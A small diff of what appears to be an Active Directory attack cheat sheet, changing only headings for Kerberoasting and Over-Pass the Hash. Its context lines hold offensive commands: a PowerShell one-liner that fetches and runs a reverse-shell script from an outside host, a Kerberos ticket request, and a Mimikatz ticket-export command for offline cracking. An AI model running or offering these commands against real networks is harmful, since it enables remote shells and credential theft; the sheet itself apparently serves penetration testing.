@@ -85,7 +85,7 @@ powershell.exe iex (iwr http://xx.xx.xx.xx/Invoke-PowerShellTcp.ps1 -UseBasicPar
 
 Creates a valid kerberos ticket using the ntlm hash of a user. Authenticate to Kerberos enabled Services afterfwards.
 
-## **Kerberoasting**
+## **🍳Kerberoasting**
 
 ### **Description**
 
@@ -107,10 +107,9 @@ New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentL
 **Dump the ticket**\
 Invoke-Mimikatz -Command '"kerberos::list /export"'
 
-\=> Now Crack\
+\=> Now Crack
 
-
-## Over-Pass the Hash <a href="#over-pass-the-hash" id="over-pass-the-hash"></a>
+## ⏩Over-Pass the Hash
 
 ### Description
 
